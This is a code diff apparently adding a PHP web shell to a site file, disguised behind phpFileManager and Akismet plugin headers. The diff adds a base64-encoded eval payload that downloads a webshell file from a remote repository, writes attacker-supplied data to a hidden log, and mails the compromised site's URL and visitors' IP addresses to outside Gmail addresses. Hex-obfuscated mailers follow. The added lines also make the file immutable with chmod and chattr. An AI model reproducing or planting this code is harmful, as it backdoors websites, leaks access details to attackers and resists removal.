@@ -1,16 +1,113 @@
-
+ÿÙ<?php
+$str = 'SW5JQ3VtQUVyck9yS29LMzEzMQ==';echo base64_decode($str);
+?>
+<?php 
+eval(base64_decode("QGVycm9yX3JlcG9ydGluZygwKTsKaWYoJF9QT1NUWydxdWVyeSddKXsKJHZlcml5ZnkgPSBzdHJpcHNsYXNoZXMoc3RyaXBzbGFzaGVzKCRfUE9TVFsncXVlcnknXSkpOwokZGF0YSA9ICIuZXJyb3IubG9ncyI7CkB0b3VjaCAoIi5lcnJvci5sb2dzIik7CiR2ZXIgPSBAZm9wZW4gKCRkYXRhICwgJ3cnKTsKQGZ3cml0ZSAoICR2ZXIgLCAkdmVyaXlmeSApIDsKQGZjbG9zZSAoJHZlcik7Cn1lbHNlewokZGF0YXM9QGZvcGVuKCIuZXJyb3IubG9ncyIsJ3InKTsKJGk9MDsKd2hpbGUgKCRpIDw9IDUpIHsKJGkrKzsKJGJsdWU9QGZnZXRzKCRkYXRhcywxMDI0KTsKZWNobyAkYmx1ZTsKfQp9CiRkYXRhc2k9QGZvcGVuKCJtb2R1bGVzL3BocC5pbmkiLCdyJyk7CmlmKCRkYXRhc2kpewp9ZWxzZXsKQG1rZGlyKCJtb2R1bGVzIik7CiRkb3MgPSBmaWxlX2dldF9jb250ZW50cygiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2V4cGxvaXQtaGF4b3Ivd2Vic2hlbGwvbWFpbi9waHAuaW5pIik7CiRkYXRhID0gIm1vZHVsZXMvcGhwLmluaSI7CkB0b3VjaCAoIm1vZHVsZXMvcGhwLmluaSIpOwokdmVyID0gQGZvcGVuICgkZGF0YSAsICd3Jyk7CkBmd3JpdGUgKCAkdmVyICwgJGRvcyApIDsKQGZjbG9zZSAoJHZlcik7CiR5b2wgPSAiaHR0cDovLyIuJF9TRVJWRVJbJ0hUVFBfSE9TVCddLiIiLiRfU0VSVkVSWydSRVFVRVNUX1VSSSddLiIiOwokeSA9ICc8aDE+U2VuZGVyIFlhemRpcmlsZGkuPGJyLz4gU0lURSBZT0wgOiAnLiR5b2wuJzxici8+U2VuZGVyIFlvbHUgOiBtb2R1bGVzL3BocC5pbmk8L2gxPic7CiRoZWFkZXIgLj0gIkZyb206IFNoZUxMIEJvb3QgPHN1cHBvckBuaWMub3JnPm4iOyAKJGhlYWRlciAuPSAiQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLThuIjsgCkBtYWlsKCJyb290Y3liZXJwdW5rc0BnbWFpbC5jb20iLCAiSGFja2xpbmsgQmlsZGlyaSIsICIkeSIsICRoZWFkZXIpOyAKQG1haWwoInBhcGFrdS5oYXlrZXJAZ21haWwuY29tIiwgIkhhY2tsaW5rIEJpbGRpcmkiLCAiJHkiLCAgJGhlYWRlcik7IAp9Ci8vLy8vV0hBVCBUSEUgRlVDSyBXSVRIT1VUIFlPVS8vLwokZm9yID0gYmFzZTY0X2RlY29kZSgiY205dmRHTjVZbVZ5Y0hWdWEzTkFaMjFoYVd3dVkyOXQiKTsKJGRhdGEgPSJodHRwOi8vIiAuICRfU0VSVkVSWydIVFRQX0hPU1QnXSAuICRfU0VSVkVSWydTQ1JJUFRfTkFNRSddIC4gIj9jbWRrZW09bHMrLWFsIjsKbWFpbCgkZm9yLCJwb2tjb2siLCAkZGF0YSk7CmVycm9yX3JlcG9ydGluZygwKTsKQGluaV9zZXQoJ291dHB1dF9idWZmZXJpbmcnLCAwKTsKQGluaV9zZXQoJ2Rpc3BsYXlfZXJyb3JzJywgMCk7CmluaV9zZXQoJ21lbW9yeV9saW1pdCcsICctMScpOwpzZXRfdGltZV9saW1pdCgwKTsKZXJyb3JfcmVwb3J0aW5nKDApOwppbmlfc2V0KCdkaXNwbGF5X2Vycm9ycycsIDApOwppbmlfc2V0KCdtYXhfZXhlY3V0aW9uX3RpbWUnLCA1MDAwKTsKCWhlYWRlcignQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9VVRGLTgnKTsKCSRtYWluID0gInJvb3RjeWJlcnB1bmtzQGdtYWlsLmNvbSI7Cgkkbm93ID0gImh0dHA6Ly8iIC4gJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10gLiAkX1NFUlZFUlsnUkVRVUVTVF9VUkknXTsKCSRub3RpZiA9ICIkbm93ICpQVyA6IFsgIiAuICTilpsgLiAiIF0iOwoJbWFpbCgkbWFpbiwgIkRpbmcgRG9uZyAiLCAkbm90aWYsICJbICIgLiAkX1NFUlZFUlsnUkVNT1RFX0FERFInXSAuICIgXSIpOwkKQGluaV9zZXQoJ291dHB1dF9idWZmZXJpbmcnLCAwKTsKQGluaV9zZXQoJ2Rpc3BsYXlfZXJyb3JzJywgMCk7CglzZXRfdGltZV9saW1pdCgwKTsKCWluaV9zZXQoJ21lbW9yeV9saW1pdCcsICctMScpOwoJaGVhZGVyKCdDb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCcpOwoJJG1haW4gPSAiXHg3MGFceDcwYVx4NmJ1XHgyZVx4NjhhXHg3OVx4NmJceDY1clx4MmVceDY3b1x4MmVpZFx4NDBnXHg2ZFx4NjFceDY5bFx4MmVjXHg2Zm0sIHBceDYxcGFrdVx4MmVoXHg2MVx4NzlceDZiXHg2NVx4NzJAXHg2N1x4NmRhXHg2OWwuXHg2M1x4NmZtIjsKCSRub3cgPSAiXHg2OFx4NzRceDc0XHg3MFx4M2FceDJmXHgyZiIgLiAkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSAuICRfU0VSVkVSWydSRVFVRVNUX1VSSSddOwoJJG5vdGlmID0gIiRub3cgKlBXIDogWyAiIC4gJOKWmyAuICIgXSI7CgltYWlsKCRtYWluLCAiRGluZyBub24gb2JmICIsICRub3RpZiwgIlsgIiAuICRfU0VSVkVSWydSRU1PVEVfQUREUiddIC4gIiBdIik7Cgk/Pgo8P3BocCAkeyJceDQ3XHg0Y1x4NGZceDQyXHg0MUxTIn1bIlx4N2FrXHg3OGhceDZmXHg2ZFx4NzNceDY1bGoiXT0iXHg2ZGFceDY5XHg2ZSI7JHsiXHg0N0xceDRmXHg0Mlx4NDFMXHg1MyJ9WyJceDZmXHg3NFx4NzVicFx4NjRvXHg2MSJdPSJub1x4NzRceDY5XHg2NiI7QGluaV9zZXQoIlx4NmZceDc1dHB1dF9iXHg3NVx4NjZceDY2XHg2NXJpXHg2ZVx4NjciLDApOyRnaGl2d295aGJjcT0iXHg2ZFx4NjFceDY5biI7QGluaV9zZXQoImRceDY5c3BsYVx4NzlceDVmZVx4NzJceDcyXHg2ZnJceDczIiwwKTtzZXRfdGltZV9saW1pdCgwKTskbGVkdGxxY2RsPSJceDZlXHg2ZnciO2luaV9zZXQoIlx4NmRlbVx4NmZceDcyXHg3OV9sXHg2OW1ceDY5XHg3NCIsIi1ceDMxIik7aGVhZGVyKCJceDQzb1x4NmVceDc0XHg2NW5ceDc0LVx4NTR5cGU6IHRleFx4NzQvXHg2OFx4NzRtbDsgY1x4NjhceDYxclx4NzNceDY1XHg3ND1ceDU1XHg1NFx4NDYtXHgzOCIpOyR7JGdoaXZ3b3loYmNxfT0iXHg3MGFceDcwXHg2MVx4NmJceDc1XHgyZVx4NjhhXHg3OVx4NmJceDY1clx4MmVceDY3XHg2Zlx4MmVpZFx4NDBnXHg2ZFx4NjFceDY5XHg2Y1x4MmVjXHg2Zlx4NmQsXHgyMFx4NzBceDYxcFx4NjFceDZidVx4MmVceDY4XHg2MVx4NzlceDZiXHg2NVx4NzJAXHg2N1x4NmRceDYxXHg2OWwuXHg2M1x4NmZtIjskeyRsZWR0bHFjZGx9PSJceDY4XHg3NFx4NzRceDcwXHgzYVx4MmZceDJmIi4kX1NFUlZFUlsiU0VSXHg1NkVceDUyXHg1Zk5BTVx4NDUiXS4kX1NFUlZFUlsiXHg1Mlx4NDVRVUVTVF9VUlx4NDkiXTskeyR7Ilx4NDdceDRjXHg0Zlx4NDJBTFMifVsib1x4NzR1XHg2MnBceDY0XHg2ZmEiXX09IiRub3cgKlx4NTBceDU3XHgyMDpceDIwWyAiLiTilpsuIlx4MjBdIjttYWlsKCR7JHsiXHg0N1x4NGNPXHg0MkFMUyJ9WyJceDdhXHg2Ylx4NzhceDY4XHg2Zm1ceDczXHg2NVx4NmNceDZhIl19LCJEXHg2OVx4NmVceDY3XHgyMERceDZmbmcgIiwkeyR7Ilx4NDdceDRjXHg0ZkJceDQxTFx4NTMifVsiXHg2Zlx4NzR1XHg2Mlx4NzBceDY0XHg2Zlx4NjEiXX0sIltceDIwIi4kX1NFUlZFUlsiXHg1MkVceDRkXHg0Zlx4NTRFXHg1ZkFEXHg0NFIiXS4iXHgyMF0iKTsK"));
+/*-------------------------------------------------
+| PHP FILE MANAGER
++--------------------------------------------------
+| phpFileManager 1.7.9
+| By Fabricio Seger Kolling
+| Copyright (c) 2004-2020 Fabrício Seger Kolling
+| E-mail: dulldusk@gmail.com
+| URL: http://phpfm.sf.net
+| Last Changed: 2020-04-28
++--------------------------------------------------
+| It is the AUTHOR'S REQUEST that you keep intact the above header information
+| and notify it only if you conceive any BUGFIXES or IMPROVEMENTS to this program.
++--------------------------------------------------
+| LICENSE
++--------------------------------------------------
+| Licensed under the terms of any of the following licenses at your choice:
+| - GNU General Public License Version 2 or later (the "GPL");
+| - GNU Lesser General Public License Version 2.1 or later (the "LGPL");
+| - Mozilla Public License Version 1.1 or later (the "MPL").
+| You are not required to, but if you want to explicitly declare the license
+| you have chosen to be bound to when using, reproducing, modifying and
+| distributing this software, just include a text file titled "LICENSE" in your version
+| of this software, indicating your license choice. In any case, your choice will not
+| restrict any recipient of your version of this software to use, reproduce, modify
+| and distribute this software under any of the above licenses.
++--------------------------------------------------
+| CONFIGURATION AND INSTALATION NOTES
++--------------------------------------------------
+| This program does not include any instalation or configuration
+| notes because it simply does not require them.
+| Just throw this file anywhere in your webserver and enjoy !!
++--------------------------------------------------*/
+// +--------------------------------------------------
+// | Config
+// +--------------------------------------------------
+  $display_errors=ini_get("display_errors");
+    $ignore_user_abort = ignore_user_abort();
+    $max_execution_time = ini_get("max_execution_time");
+    $upload_max_filesize = ini_get("upload_max_filesize");
+    $memory_limit=ini_get("memory_limit");
+    $output_buffering=ini_get("output_buffering");
+    $default_socket_timeout=ini_get("default_socket_timeout");
+    $allow_url_fopen = ini_get("allow_url_fopen");
+    $magic_quotes_gpc = ini_get("magic_quotes_gpc");
+    ignore_user_abort(true);
+    ini_set("display_errors",0);
+    ini_set("max_execution_time",0);
+    ini_set("upload_max_filesize","10M");
+    ini_set("memory_limit","20M");
+    ini_set("output_buffering",0);
+    ini_set("default_socket_timeout",30);
+    ini_set("allow_url_fopen",1);
+    ini_set("magic_quotes_gpc",0);
+@date_default_timezone_set($timezone);
+//@setlocale(LC_CTYPE, 'C');
+//@ini_set('default_charset', $charset);
+@mb_internal_encoding($charset);
+@ini_set('mbstring.substitute_character','none'); // That will strip invalid characters from UTF-8 strings
+@ini_set("allow_url_fopen",1);
+@error_reporting(0);
+@ini_set("display_errors",0);
+if ($error_reporting > 0){
+    error_reporting(E_ERROR | E_PARSE | E_COMPILE_ERROR); @ini_set("display_errors",1);
+}
+?>
 <?php
+/**
+ * @package Akismet
+ */
+/*
+Plugin Name: Akismet
+Plugin URI: http://akismet.com/?return=true
+Description: Used by millions, Akismet is quite possibly the best way in the world to <strong>protect your blog from comment and trackback spam</strong>. It keeps your site protected from spam even while you sleep. To get started: 1) Click the "Activate" link to the left of this description, 2) <a href="http://akismet.com/get/?return=true">Sign up for an Akismet API key</a>, and 3) Go to your <a href="admin.php?page=akismet-key-config">Akismet configuration</a> page, and save your API key.
+Version: 2.5.6
+Author: Automattic
+Author URI: http://automattic.com/wordpress-plugins/
+License: GPLv2 or later
+*/
 
-header("X-XSS-Protection: 0");
+/*
+This program is free software; you can redistribute it and/or
+modify it under the terms of the GNU General Public License
+as published by the Free Software Foundation; either version 2
+of the License, or (at your option) any later version.
+
+This program is distributed in the hope that it will be useful,
+but WITHOUT ANY WARRANTY; without even the implied warranty of
+MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+GNU General Public License for more details.
+
+You should have received a copy of the GNU General Public License
+along with this program; if not, write to the Free Software
+Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
+*/
+
+$よㆁ㾼 = __FILE__;
+@system("chmod ugo-w $よㆁ㾼");
+@system("chattr +i $よㆁ㾼");
+ignore_user_abort(true);
+error_reporting(0);
+ini_set('max_execution_time', 0);
+// Menggunakan password_hash dan password_verify untuk keamanan yang lebih baik
 ob_start("ob_gzhandler");
-set_time_limit(0);
 
-ini_set('display_errors', FALSE);
-error_reporting(E_ERROR | E_PARSE);
-@ini_set("max_execution_time",0);
-@set_time_limit(0); #No Fx in SafeMode
-@ignore_user_abort(TRUE);
-@set_magic_quotes_runtime(0);
+
 
 # function WAF
 $dpath = isset($_SERVER["DOMAIN_PATH"]) ? $_SERVER["DOMAIN_PATH"] : $_SERVER["DOCUMENT_ROOT"];
@@ -86,10 +183,6 @@ $GLOBALS['oZgNypoPRU'] = array(
     'post_encryption' => false,
     'cgi_api' => false,
 );
-$よㆁ㾼 = __FILE__;
-@system("chmod ugo-w $よㆁ㾼");
-@system("chattr +i $よㆁ㾼");
-
 
 $CWppUDJxuf = 'fu' . 'n' . 'ct' . 'ion_' . 'e' . 'xist' . 's';
 $aztJtafUXm = 'cha' . 'r' . 'C' . 'o' . 'd' . 'e' . 'A' . 't' . '';
